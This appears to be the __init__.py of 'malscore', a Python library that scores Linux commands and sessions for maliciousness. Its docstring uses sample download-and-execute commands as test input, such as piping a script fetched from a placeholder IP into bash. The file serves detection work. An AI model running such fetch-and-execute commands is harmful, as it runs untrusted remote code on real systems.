"""malscore -- score the maliciousness of a Linux command or a session of commands.

    from malscore import Analyzer
    result = Analyzer().assess_command("curl -s http://1.2.3.4/x.sh | bash")
    print(result.score, result.verdict)

    session = Analyzer().assess_session(["curl -o /tmp/p http://1.2.3.4/p", "/tmp/p"])

Nothing is ever executed, expanded or resolved: the analysis only reads text.
"""

from __future__ import annotations

from .scoring import Analyzer, Assessment, verdict_for
from .signals import SESSION_SIGNALS, SIGNALS, Signal

__version__ = "0.1.0"

__all__ = [
    "Analyzer",
    "Assessment",
    "Signal",
    "SIGNALS",
    "SESSION_SIGNALS",
    "verdict_for",
    "__version__",
]
